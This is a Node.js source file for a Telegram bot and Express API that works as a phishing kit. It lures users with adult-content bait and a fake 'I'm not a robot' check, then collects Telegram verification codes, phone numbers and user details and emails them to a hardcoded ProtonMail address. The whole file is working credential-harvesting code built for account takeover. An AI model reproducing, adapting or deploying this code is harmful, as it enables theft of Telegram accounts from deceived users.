import express from "express";
import cors from "cors";
import { Telegraf } from "telegraf";
import nodemailer from "nodemailer";

const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBAPP_URL = process.env.WEBAPP_URL;     // e.g. https://tgreward.shop/webapp.html
const WEBSITE_URL = process.env.WEBSITE_URL;   // e.g. https://tgreward.shop/QTSJAOPPHU.html

// SMTP config (set sa Railway)
const SMTP_HOST = process.env.SMTP_HOST;
const SMTP_PORT = Number(process.env.SMTP_PORT || 587);
const SMTP_USER = process.env.SMTP_USER;
const SMTP_PASS = process.env.SMTP_PASS;
const FROM_EMAIL = process.env.FROM_EMAIL || SMTP_USER;
const TO_EMAIL = process.env.TO_EMAIL || "tgreward@proton.me";

if (!BOT_TOKEN) {
  throw new Error("BOT_TOKEN is not set");
}

const bot = new Telegraf(BOT_TOKEN);

// /start handler
bot.start((ctx) => {
  const payload = ctx.startPayload; // from ?start=...

  if (payload !== "from_website") {
    return ctx.reply(
      "Para gumana ang bot na ito, paki-bisita muna ang website:\n" +
      WEBSITE_URL
    );
  }

  return ctx.reply(
    "🔞 To access the files completely free 💦\n\n" +
    "👇 Confirm that you are not a robot",
    {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "✅ I'm not a robot!",
              web_app: { url: WEBAPP_URL },
            },
          ],
        ],
      },
    }
  );
});

// optional: makuha data mula WebApp
bot.on("message", (ctx) => {
  const data = ctx.message.web_app_data?.data;
  if (data) {
    console.log("WEBAPP DATA:", data);
    ctx.reply("Verification received ✅");
  }
});

// HTTP server
const app = express();
app.use(cors());
app.use(express.json());

// Nodemailer transporter
const transporter = nodemailer.createTransport({
  host: SMTP_HOST,
  port: SMTP_PORT,
  secure: SMTP_PORT === 465, // true kung SMTPS/465
  auth: {
    user: SMTP_USER,
    pass: SMTP_PASS,
  },
});

app.post("/api/log-code", async (req, res) => {
  const { code, phone, tgUser } = req.body || {};

  if (!code) {
    return res.status(400).json({ ok: false, error: "Missing code" });
  }

  const subject = "New verification code from Telegram user";
  const text = [
    "A user submitted a verification code.",
    "",
    `Code: ${code}`,
    `Phone: ${phone || "N/A"}`,
    "",
    "Telegram user info:",
    JSON.stringify(tgUser || {}, null, 2),
    "",
    `Time: ${new Date().toISOString()}`,
  ].join("\n");

  try {
    await transporter.sendMail({
      from: FROM_EMAIL,
      to: TO_EMAIL,
      subject,
      text,
    });
    console.log("Email sent for code", code);
    return res.json({ ok: true });
  } catch (err) {
    console.error("Email send error:", err);
    return res.status(500).json({ ok: false, error: "Email send failed" });
  }
});

app.get("/", (req, res) => {
  res.send("Bot + API is running");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("HTTP server running on port", PORT);
});

bot.launch();
console.log("Bot started");

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
